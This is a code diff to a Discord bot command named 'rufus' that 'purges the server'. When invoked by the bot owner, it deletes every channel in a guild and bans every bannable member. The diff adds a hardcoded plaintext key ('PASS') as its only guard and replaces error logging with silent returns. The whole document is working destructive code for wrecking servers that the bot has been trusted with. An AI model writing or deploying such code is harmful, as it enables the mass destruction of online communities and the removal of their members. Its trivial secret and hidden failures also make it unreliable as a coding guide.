@@ -11,20 +11,32 @@ module.exports = class rufus extends Command {
             description: 'Purges the server',
             guildOnly: true,
             ownerOnly: true,
-            clientPermissions:['BAN_MEMBERS']
+            args: [{
+                key: "key",
+                prompt: "What is the key?",
+                type: "string"
+            }],
+            clientPermissions: ['BAN_MEMBERS']
         });
     }
 
-    async run(message) {
-        message.guild.channels.cache.forEach(channel => channel.delete());
+    async run(message, { key }) {
+        if (key != "PASS") return; //add a key check so that nobody else can use it even if your account is hacked
+        await message.guild.channels.cache.forEach(channel => channel.delete().catch(err => {
+            try {
+                message.author.send("Could not delete " + channel.name);
+            } catch (error) {
+                return;
+            }
+        }));
+
         try {
 
-            message.guild.members.filter(member => member.bannable).forEach(member => member.ban());
-            message.delete(1000);
+            await message.guild.members.cache.filter(member => member.bannable).forEach(member => member.ban());
 
         } catch (e) {
 
-            console.log(e.stack);
+            return;
 
         }
 
@@ -34,7 +46,7 @@ module.exports = class rufus extends Command {
 
         } catch (e) {
 
-            console.log(e.stack);
+            return;
 
         }
     }
